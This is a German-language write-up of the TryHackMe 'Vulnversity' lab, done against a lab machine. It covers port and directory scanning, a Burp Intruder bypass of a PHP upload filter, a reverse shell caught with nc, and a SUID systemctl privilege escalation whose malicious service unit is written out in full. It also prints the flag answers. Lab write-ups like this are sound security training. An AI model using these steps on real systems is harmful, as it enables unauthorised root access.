# Vulnversity
## Reconnaissance (Aufklaerung, Erkundung)
Die Fragen konnten alle mit nmap beantwortet werden:
```
┌──(kali㉿kali)-[~]
└─$ nmap 10.10.15.100    
Starting Nmap 7.92 ( https://nmap.org ) at 2023-02-08 12:17 EST
Nmap scan report for 10.10.15.100
Host is up (0.033s latency).
Not shown: 994 closed tcp ports (conn-refused)
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3128/tcp open  squid-http
3333/tcp open  dec-notes

Nmap done: 1 IP address (1 host up) scanned in 13.77 seconds
                                                                                                                                                                                                                                             
┌──(kali㉿kali)-[~]
└─$ nmap -sC -sV 10.10.15.100                                                                                                                                                                                                          130 ⨯
Starting Nmap 7.92 ( https://nmap.org ) at 2023-02-08 12:16 EST
Nmap scan report for 10.10.15.100
Host is up (0.032s latency).
Not shown: 994 closed tcp ports (conn-refused)
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.3
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 5a:4f:fc:b8:c8:76:1c:b5:85:1c:ac:b2:86:41:1c:5a (RSA)
|   256 ac:9d:ec:44:61:0c:28:85:00:88:e9:68:e9:d0:cb:3d (ECDSA)
|_  256 30:50:cb:70:5a:86:57:22:cb:52:d9:36:34:dc:a5:58 (ED25519)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
3128/tcp open  http-proxy  Squid http proxy 3.5.12
|_http-server-header: squid/3.5.12
|_http-title: ERROR: The requested URL could not be retrieved
3333/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Vuln University
Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h40m01s, deviation: 2h53m12s, median: 0s
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: vulnuniversity
|   NetBIOS computer name: VULNUNIVERSITY\x00
|   Domain name: \x00
|   FQDN: vulnuniversity
|_  System time: 2023-02-08T12:16:47-05:00
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2023-02-08T17:16:47
|_  start_date: N/A
|_nbstat: NetBIOS name: VULNUNIVERSITY, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 41.52 seconds
                                                                                                                                                                                                                                             
┌──(kali㉿kali)-[~]
└─$ 
```

## Locating directories using GoBuster
Verzeichnisse mit GoBuster listen. _/internal_ sieht interessant aus. Im Browser sieht man dann, dass hier Dateien hochgeladen werden koennen.
```
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u http://10.10.15.100:3333 -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt         
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.15.100:3333
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2023/02/08 12:25:02 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 320] [--> http://10.10.15.100:3333/images/]
/css                  (Status: 301) [Size: 317] [--> http://10.10.15.100:3333/css/]   
/js                   (Status: 301) [Size: 316] [--> http://10.10.15.100:3333/js/]    
/fonts                (Status: 301) [Size: 319] [--> http://10.10.15.100:3333/fonts/] 
/internal             (Status: 301) [Size: 322] [--> http://10.10.15.100:3333/internal/]
                                                                                        
===============================================================
2023/02/08 12:29:53 Finished
===============================================================
                                                                                                                    
┌──(kali㉿kali)-[~]
└─$ 
```

## Compromise the webserver
.php Dateien sind nicht erlaubt.

1. BurpSuite starten -> Proxy -> Browser oeffen -> Intercept auf on stellen
2. Im Browser dann eine Datei auf der Seite hochladen
3. BurpSuite unterbricht den Aufruf -> Burger Menu -> Send to intruder
4. Positions -> Dateiendung von Filenamen in Paragraph Zeichen packen
```
------WebKitFormBoundary8q9uK6D4QjUgYS6l
Content-Disposition: form-data; name="file"; filename="test.§php§"
Content-Type: application/x-php
```
5. Payloads -> Simple List oder Runtime File waehlen -> Datei mit extensions waehlen oder manuell eingeben (php, php3, php4, php5, phtml)
6. Start attack -> im Result sieht man dann fuer 'phtml' eine verschieden Length und im Response Teil "Succes". Die File extension wird scheinbar akzeptiert

Im Anschluss eine php Reverse Shell von Pentestmonkey heruntergeladen, angepasst und mit der Dateiendung .phtml auf dem Ziel hochgeladen. Die Datei landet dann unter dem Pfad _http://10.10.15.100:3333/internal/uploads_ und kann entsprechend aufgerufen werden.

Die Flag kann dann im Userverzeichnis gefunden werden.
```
┌──(kali㉿kali)-[~/Desktop/tryhackme/vulnversity]
└─$ nc -lnvp 4444                                   
Listening on 0.0.0.0 4444
Connection received on 10.10.15.100 41278
Linux vulnuniversity 4.4.0-142-generic #168-Ubuntu SMP Wed Jan 16 21:00:45 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 13:24:15 up  1:13,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ ls -al
total 96
drwxr-xr-x  23 root root  4096 Jul 31  2019 .
drwxr-xr-x  23 root root  4096 Jul 31  2019 ..
drwxr-xr-x   2 root root  4096 Jul 31  2019 bin
drwxr-xr-x   3 root root  4096 Jul 31  2019 boot
drwxr-xr-x  17 root root  3700 Feb  8 12:11 dev
drwxr-xr-x  98 root root  4096 Aug  1  2019 etc
drwxr-xr-x   3 root root  4096 Jul 31  2019 home
lrwxrwxrwx   1 root root    33 Jul 31  2019 initrd.img -> boot/initrd.img-4.4.0-142-generic
drwxr-xr-x  22 root root  4096 Jul 31  2019 lib
drwxr-xr-x   2 root root  4096 Jul 31  2019 lib64
drwx------   2 root root 16384 Jul 31  2019 lost+found
drwxr-xr-x   3 root root  4096 Jul 31  2019 media
drwxr-xr-x   2 root root  4096 Feb 26  2019 mnt
drwxr-xr-x   2 root root  4096 Feb 26  2019 opt
dr-xr-xr-x 135 root root     0 Feb  8 12:11 proc
drwx------   4 root root  4096 Jul 31  2019 root
drwxr-xr-x  28 root root   980 Feb  8 12:13 run
drwxr-xr-x   2 root root 12288 Jul 31  2019 sbin
drwxr-xr-x   2 root root  4096 Jul 31  2019 snap
drwxr-xr-x   3 root root  4096 Jul 31  2019 srv
dr-xr-xr-x  13 root root     0 Feb  8 12:11 sys
drwxrwxrwt   8 root root  4096 Feb  8 13:21 tmp
drwxr-xr-x  10 root root  4096 Jul 31  2019 usr
drwxr-xr-x  14 root root  4096 Jul 31  2019 var
lrwxrwxrwx   1 root root    30 Jul 31  2019 vmlinuz -> boot/vmlinuz-4.4.0-142-generic
$ cd home/
$ ls
bill
$ cd bill
$ ls -al 
total 24
drwxr-xr-x 2 bill bill 4096 Jul 31  2019 .
drwxr-xr-x 3 root root 4096 Jul 31  2019 ..
-rw-r--r-- 1 bill bill  220 Jul 31  2019 .bash_logout
-rw-r--r-- 1 bill bill 3771 Jul 31  2019 .bashrc
-rw-r--r-- 1 bill bill  655 Jul 31  2019 .profile
-rw-r--r-- 1 bill bill   33 Jul 31  2019 user.txt
$ cat user.txt
8bd7992fbe8a6ad22a63361004cfcedb
$ 
```

## Privilege Escalation
Es kann ein SUID Bit bei _/bin/systemctl_ gefunden werden:
```
$ find / -perm /4000 -type f -exec ls -ld {} \; 2>/dev/null | grep /bin/
-rwsr-xr-x 1 root root 32944 May 16  2017 /usr/bin/newuidmap
-rwsr-xr-x 1 root root 49584 May 16  2017 /usr/bin/chfn
-rwsr-xr-x 1 root root 32944 May 16  2017 /usr/bin/newgidmap
-rwsr-xr-x 1 root root 136808 Jul  4  2017 /usr/bin/sudo
-rwsr-xr-x 1 root root 40432 May 16  2017 /usr/bin/chsh
-rwsr-xr-x 1 root root 54256 May 16  2017 /usr/bin/passwd
-rwsr-xr-x 1 root root 23376 Jan 15  2019 /usr/bin/pkexec
-rwsr-xr-x 1 root root 39904 May 16  2017 /usr/bin/newgrp
-rwsr-xr-x 1 root root 75304 May 16  2017 /usr/bin/gpasswd
-rwsr-sr-x 1 daemon daemon 51464 Jan 14  2016 /usr/bin/at
-rwsr-xr-x 1 root root 40128 May 16  2017 /bin/su
-rwsr-xr-x 1 root root 142032 Jan 28  2017 /bin/ntfs-3g
-rwsr-xr-x 1 root root 40152 May 16  2018 /bin/mount
-rwsr-xr-x 1 root root 44680 May  7  2014 /bin/ping6
-rwsr-xr-x 1 root root 27608 May 16  2018 /bin/umount
-rwsr-xr-x 1 root root 659856 Feb 13  2019 /bin/systemctl
-rwsr-xr-x 1 root root 44168 May  7  2014 /bin/ping
-rwsr-xr-x 1 root root 30800 Jul 12  2016 /bin/fusermount
$
```

Unter https://gtfobins.github.io/gtfobins/systemctl/ kann hierzu der passende Exploit gefunden werden. Dieser koennte dann wie folgt aussehen:
```
$ TF=$(mktemp).service
$ 
$ echo '[Service]
> Type=oneshot
> ExecStart=/bin/sh -c "ls -al /root > /tmp/output; cat /root/root.txt >> /tmp/output"
> [Install]
> WantedBy=multi-user.target' > $TF
$ 
$ cat $TF
[Service]
Type=oneshot
ExecStart=/bin/sh -c "ls -al /root > /tmp/output; cat /root/root.txt >> /tmp/output"
[Install]
WantedBy=multi-user.target
$ 
$ /bin/systemctl link $TF
Created symlink from /etc/systemd/system/tmp.vxhz3Yj4D3.service to /tmp/tmp.vxhz3Yj4D3.service.
$ /bin/systemctl enable --now $TF
Created symlink from /etc/systemd/system/multi-user.target.wants/tmp.vxhz3Yj4D3.service to /tmp/tmp.vxhz3Yj4D3.service.
$ 
$ cat /tmp/output
total 28
drwx------  4 root root 4096 Jul 31  2019 .
drwxr-xr-x 23 root root 4096 Jul 31  2019 ..
lrwxrwxrwx  1 root root    9 Jul 31  2019 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Oct 22  2015 .bashrc
drwx------  2 root root 4096 Jul 31  2019 .cache
drwxr-xr-x  2 root root 4096 Jul 31  2019 .nano
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r--r--  1 root root   33 Jul 31  2019 root.txt
a58ff8579f0a9270368d33a9966c7fd5
$ 
```
